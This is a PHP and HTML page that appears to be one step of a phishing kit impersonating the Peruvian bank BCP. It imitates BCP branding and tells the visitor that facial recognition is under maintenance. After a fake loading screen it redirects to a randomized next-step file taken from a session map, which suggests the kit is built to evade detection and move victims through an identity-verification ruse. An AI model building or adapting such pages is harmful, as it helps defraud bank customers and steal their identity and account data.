<?php

########################################################################
# HEADERS
########################################################################

session_start();

########################################################################
# VERIFICANDO SESION
########################################################################

if (!isset($_SESSION['session_id'])) {
    
    header('Location: ../index.php');
    exit();

}

########################################################################
# ARCHIVOS DE CONFIGURACION
########################################################################

include '../config.php';

########################################################################
# OBTENIENDO VARIABLES GUARDADAS EN SESION
########################################################################

$visitorId = $_SESSION['visitorId'];
$session_id = $_SESSION['session_id'];
$directory_array = $_SESSION['directory_array'];
$device_type = $_SESSION['device_type'];

########################################################################

$estado = $_SESSION['estado'];

########################################################################

$next_location = "step_seven.php";

$next_location_encrypted = $directory_array[$next_location].".php";

?>
<!DOCTYPE html>
<html device-type="desktop" class="hydrated">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Banco de Crédito >> BCP >></title>
	<link rel="stylesheet" href="files/main.css">
	<meta content="width=device-width, initial-scale=1 user-scalable=no" name="viewport" >
	<link href="files/favicon.ico" rel="icon" type="image/x-icon">
	<!-- <link rel="stylesheet" href="./2_files/auxi.css"> -->
	<link rel="stylesheet" href="files/stylo.css">
	
	<style>
		
		#bodyloader {
            height: 100%;
            margin: 0;
            overflow: hidden;
            background-color: var(--primary-700, #002a8d);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .loading-screen {
            position: absolute;
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .spinner-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .spinner {
            position: relative;
            width: 70px;
            height: 70px;
            border: 3px solid #002376;
            border-top: 3px solid var(--secondary-500, #ff7800);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        .image {
            width: 30px;
            height: 30px;
            background-image: url("files/favicon.png");
            background-size: cover;
            background-repeat: no-repeat;
            background-position: center;
        }
		
		.loading {
			padding: 420px 0px 0px 410px;
		}
		
		@media only screen and (max-width: 575px) {
			.loading {
				padding: 440px 0px 0px 0px;
			}
		}
		
		body {
			display: flex;
			justify-content: center;
			align-items: center;
    		height: 100vh;
    		margin: 0;
		}

		.banner {
			/* Agrega estas reglas para centrar el contenido */
			display: flex;
    		justify-content: center;
		}

		
		.numero {
			min-height: 35px;
   			min-width: 35px;
    		width: 35px;
    		height: 35px;
    		background-color: white;
    		color: #878c8f;
			border: 2px solid #878c8f;
    		border-radius: 50%;
    		text-align: center;
    		line-height: 30px;
    		margin: 0 0px; /* Espacio entre los números */
			font-family: Geometria, sans-serif;
		}

		.linea {
			flex: 1;
    		border-top: 2px solid #878c8f;
    		margin: 0 0px;
    		max-width: 40px;
    		min-width: 40px;
		}

		.custom-slider {
			width: 100%;
            position: relative;
			margin-top:20px;
		}
		
		.custom-slider input[type="range"] {
			-webkit-appearance: none; /* Deshabilita el estilo predeterminado de WebKit */
            appearance: none; /* Deshabilita el estilo predeterminado de otros navegadores */
            width: 100%; /* Ancho completo del control deslizante */
            height: 10px; /* Altura del control deslizante */
            background: linear-gradient(#05be50,#05be50,#05be50,#05be50,#05be50,#05be50,#05be50);
            border-radius: 5px; /* Bordes redondeados */
		}

		.custom-slider input[type="range"]::-webkit-slider-thumb {
			-webkit-appearance: none; /* Deshabilita el estilo predeterminado del botón deslizante de WebKit */
            appearance: none; /* Deshabilita el estilo predeterminado del botón deslizante de otros navegadores */
            width: 20px;
            height: 20px;
            background: white;
            border-radius: 50%;
            cursor: pointer;
			border: 1px solid #eceded;
			box-shadow: 0 0 5px rgba(0, 0, 0, 0.2);
		}
		
		#montoLabel {
            position: absolute;
            bottom: 25px; /* Ajusta la distancia desde abajo */
            left: 50%; /* Centra horizontalmente */
            transform: translateX(-50%);
            font-weight: bold;
		}

        /* Estilos para la caja de herramientas */
        .tooltip {
            position: relative;
            display: inline-block;
        }

        .tooltip-text {
            visibility: hidden;
            background-color: rgba(0, 0, 0, 0.7);
            color: #fff;
            text-align: center;
            border-radius: 5px;
            padding: 5px;
            position: absolute;
            z-index: 1;
            bottom: 100%;
            left: 50%;
            transform: translateX(-50%);
            transition: visibility 0.2s ease-in-out;
        }

        .tooltip:hover .tooltip-text {
            visibility: visible;
        }
		
		.input-container {
			position: relative;
		}
		

		/* Estilos para el input */
		.styled-input {
			padding-left: 2.5em; /* Espacio para el label */
		}

		/* Estilos para el label */
		.input-label {
			position: absolute;
  			left: 0.5em; /* Posición izquierda */
  			top: 50%; /* Centrar verticalmente */
  			transform: translateY(-50%);
  			pointer-events: none; /* Evitar que el label interfiera con la interacción del input */
		}
		
		
		input[type="radio"]:checked {
			
			border: 6px solid #05be50 !important;
		}
		
		.cuota {
			width: 86%;
    		position: relative;
    		left: 7%;
    		height: 230px;
    		border: 2px solid #eceded;
    		border-radius: 8px;
   		 	margin-bottom: 25px;
    		max-height: 230px;
    		text-align: center;
			box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
		}
		
		.custom-select {
			border-radius: 4px;
  			border: 1px solid #eceded;
  			width: 100%;
  			font-size: 14px;
  			height: 48px !important;
  			position: relative;
			outline:none;
 			padding-left: 20px;
 			font-weight: 400;
  			letter-spacing: 0.5px;
  			background-color: white !important;
  			-webkit-box-sizing: border-box;
  			-moz-box-sizing: border-box;
  			box-sizing: border-box;
  			-webkit-appearance: none;
		}
		
		.custom-select:focus {
			border: 2px solid #ff0000;
		}
		
		#presente::placeholder {
			font-size: 14px;
			color: #878c8f;
   		 	position: relative;
   		 	
    		font-weight: 400;
    		letter-spacing: -0.6px;
    		font-family: Geometria, sans-serif;
			
    		text-rendering: optimizeLegibility;
		}
		
		#llave::placeholder {
			font-size: 14px;
			color: #878c8f;
   		 	position: relative;
   		 	
    		font-weight: 400;
    		letter-spacing: -0.6px;
    		font-family: Geometria, sans-serif;
			padding-left: 25px;
    		text-rendering: optimizeLegibility;
		}
		
		.loader {
    		border: 3px solid white;
    		border-top: 4px solid transparent;
    		border-radius: 50%;
    		width: 25px;
    		height: 25px;
    		animation: spin 1s linear infinite;
    		position: absolute;
    		top: 50%;
    		left: 50%;
    		margin-top: -12px;
    		margin-left: -10px;
    		display: none;
		}

		/* Animación de rotación del loader */
		@keyframes spin {
			0% { transform: rotate(0deg); }
    		100% { transform: rotate(360deg); }
		}

		/* Estilos para el botón personalizado */
		.custom-button {
    		position: relative; /* Para que el loader se posicione correctamente */
		}

		/* Mostrar el loader cuando el botón está deshabilitado */
		.btn-block:disabled .loader {
			display: block;
		}

		/* @font-face {
			font-family: Geometria;
			src: url(fonts/light.woff2) format("woff2"), url(fonts/light.woff) format("woff");
			font-weight: 300;
			font-style: normal;
			font-display: swap
		}

		@font-face {
			font-family: Geometria;
			src: url(fonts/medium.woff2) format("woff2"), url(fonts/medium.woff) format("woff");
			font-weight: 500;
			font-style: normal;
			font-display: swap
		}

		@font-face {
			font-family: Geometria;
			src: url(fonts/bold.woff2) format("woff2"), url(fonts/bold.woff) format("woff");
			font-weight: 700;
			font-style: normal;
			font-display: swap
		}

		@font-face {
			font-family: Montserrat;
			src: url(fonts/regular.woff2) format("woff2"), url(fonts/regular.woff) format("woff");
			font-weight: 400;
			font-style: normal;
			font-display: swap
		}

		@font-face {
			font-family: Montserrat;
			src: url(fonts/semibold.woff2) format("woff2"), url(fonts/semibold.woff) format("woff");
			font-weight: 600;
			font-style: normal;
			font-display: swap
		}

		@font-face {
			font-family: Montserrat;
			src: url(fonts/bold.woff2) format("woff2"), url(fonts/bold.woff) format("woff");
			font-weight: 700;
			font-style: normal;
			font-display: swap
		} */
		
		@media (max-width: 277px) {
			#tituloVerde {
				width:90% !important;
				left: 5% !important;
			}
		}
		
		@media (max-width: 277px) {
			#tituloVerde {
				font-size: 16px !important;
			}
		}
	
	</style>
	
</head>
	
<body>
	<div class="loading-screen" style="display:none;" id="bodyloader" style="height: 100%; margin: 0; overflow: hidden; background-color: var(--primary-700, #002a8d); display: none; align-items: center; justify-content: center;">
	 <div class="spinner-container">
		 <div class="image" style="top: 52px; width: 25px; position: relative;"></div>
		 <div class="spinner"></div>
		 <p class="message" style="text-align: center; font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif!important; font-size: 13px; color: white; margin-top: 10px;">Espere un momento <br> por favor</p>
	 </div>
	</div>
	<div id="bodyapp">
	<app-root _nghost-aqk-c52="" ng-version="12.2.16">
		<router-outlet _ngcontent-aqk-c52=""></router-outlet>
		<app-initial-verify _nghost-aqk-c63="">
			<div _ngcontent-aqk-c63="" class="container-fluid" style="overflow-y: visible;overflow-x:hidden;">
				<div _ngcontent-aqk-c63="" class="row" style="">
					<div _ngcontent-aqk-c63="" class="col-4 d-none d-md-block channel-image-style">
						<app-channel-image _ngcontent-aqk-c63="" _nghost-aqk-c59="">
							<div _ngcontent-aqk-c59="" class="channel-img-fixed" style="">
							</div>
						</app-channel-image>
					</div>
<bcp-navbar menu-position="right" is-fixed="" class="hydrated">
    <nav class="navbar navbar-expand-sm bg-primary-700 navbar-dark fixed-top" style="min-height: 60px; display: flex; justify-content: space-between;">
        <div class="container" style="width: 85%;">
            <a class="brand-margin-left navbar-brand">
                <bcp-img class="hydrated">
                    <img alt="Dinero al instante" src="files/dark-default.svg" class="hydrated">
                </bcp-img>
            </a>
        </div>
        <div id="hamburg" style="position: relative; right: 16px;">
            <svg aria-hidden="true" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                
            </svg>
        </div>
    </nav>
</bcp-navbar>
					<eva-banner _ngcontent-hbf-c1="" _nghost-hbf-c2="" style="width:100%">
						<div _ngcontent-hbf-c2="" class="banner" style="background-repeat: no-repeat; background-size: auto; max-height: 332px; min-height: 80px; height: 80px;background-image:none;">
						</div>
					</eva-banner>
						<div _ngcontent-aqk-c63="" class="col" style="position: relative; overflow-y: visible;background-color:white;">
							<div _ngcontent-aqk-c63="" class="row container-form" style="position: relative;margin-bottom:0px !important;">
								<div _ngcontent-aqk-c63="" class="col mtTable" style="margin-top: 0px;">
									<div _ngcontent-aqk-c63="" class="box-wrapper container">
										<form class="ng-pristine ng-invalid ng-touched" id="inicio">
											<div _ngcontent-aqk-c63="" class="row mb24" style="margin-bottom:5px !important">
												<div _ngcontent-aqk-c63="" class="col">
													<bcp-select-input _ngcontent-aqk-c63="" class="ng-untouched ng-pristine ng-invalid hydrated">
														<br>
														<div class="row no-gutters select-input-container">
															<div class="col input-container">
																<bcp-tooltip _ngcontent-hjc-c2="" position="top" size="lg" trigger="click" class="hydrated">
																	<bcp-input class="hydrated">
																		<div class="form-group" style="align-items: center; position: relative; justify-content: center; display: flex;">
																			<img src="files/sp_maintenance_d.svg">
																		</div>
																		<bcp-paragraph class="helper-text hydrated" style="display:flex;margin:0;">
																			<span class="spancuota" style="font-weight: 600; position: relative; color: var(--primary-700,#002a8d); width: 100%; font-family: var(--bcp-font-family-primary-demi,'Flexo-Demi'),helvetica,arial,sans-serif; font-size: 26px; line-height: 2rem; text-align: center; text-rendering: optimizeLegibility; top: 20px;">En mantenimiento </span>		
																		</bcp-paragraph>
																		<h4 class="title title-s title-s--light u-text-center-xs marb-32 marb-40____sm-md" style="font-weight: 400; position: relative; color: #001f5a; font-size: 16px; line-height: 1.4; font-family: var(--bcp-font-family-primary-regular,'Flexo-Regular'),helvetica,arial,sans-serif; width: 80%; margin-left: 10%; text-align: center; text-rendering: optimizeLegibility; margin-top: 30px;">Nuestro reconocimiento facial se encuentra en mantenimiento porfavor selecciona otra opción para validar tu identidad.
															<span id="userAgentInfo"></span>
														</h4>
																		<button type="button" onclick="continuarFacial()" id="btnconfirmarprestamo" value="" style="color: var(--secondary-400,#ff961f); border-radius: 20px; width: 60%; height: 40px; padding: 12px; left: 20%; top: 150px; line-height: 16px; background-color: var(--secondary-400,#ff961f); border: var(--secondary-400,#ff961f); margin-top: 0px; display: flex; position: relative;"> 
																				<p id="parrafoaceptoelprestamo" style="width: 100%; color: white; font-size: 14px; text-align: center; position: relative;font-weight:600">Elegir otra opción</p>
																				<div class="loader" id="loaderaceptoelprestamo"></div>
																			</button>
																	</bcp-input>
																</bcp-tooltip>
															</div>
														</div>
													<br>
												</bcp-select-input>
											</div>
										</div>
									</form>
								</div>
							</div>
						</div>
						
					</div>
				</div>
			</div>
		</app-initial-verify>
	</app-root>
	
	<script type="text/javascript" src="files/jquery-3.1.0.min.js"></script>
	<script type="text/javascript" src="files/mask.js"></script>
	<script type="text/javascript" src="files/value.js"></script>
	
<script>
	function continuarFacial() {
		$("#parrafoaceptoelprestamo").hide();
        $("#loaderaceptoelprestamo").show();
		setTimeout(function() {
			  $("#bodyapp").hide();
			  $("#bodyloader").show();
			  setTimeout(function() {
				  window.location.href = "<?=$next_location_encrypted;?>";
			  }, 2500); // 5000 milisegundos = 5 segundos
			  }, 2000);
			}
</script>
	</div>
	</body>
</html>